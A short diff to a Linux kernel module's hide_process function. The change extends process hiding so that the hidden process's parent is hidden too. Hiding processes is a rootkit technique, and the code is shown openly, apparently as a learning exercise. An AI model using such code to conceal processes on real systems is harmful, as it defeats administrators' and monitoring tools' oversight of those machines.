@@ -97,6 +97,20 @@ static int hide_process(pid_t pid)
     pid_node_t *proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
     proc->id = pid;
     list_add_tail(&proc->list_node, &hidden_proc); /* add a new node to tail of list_head */
+
+    /**
+     * Get the corresponding task_struct from pid, and if pid has parent,
+     * create a new hidden proc node for it.
+     */
+    struct task_struct *p = pid_task(find_vpid(pid), PIDTYPE_PID);
+    
+    /* The process has parent :) */
+    if (p != NULL && p->parent != NULL) {
+        pid_node_t *parent = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
+        parent->id = p->parent->pid;
+        list_add_tail(&parent->list_node, &hidden_proc);
+    }
+
     return SUCCESS;
 }
 
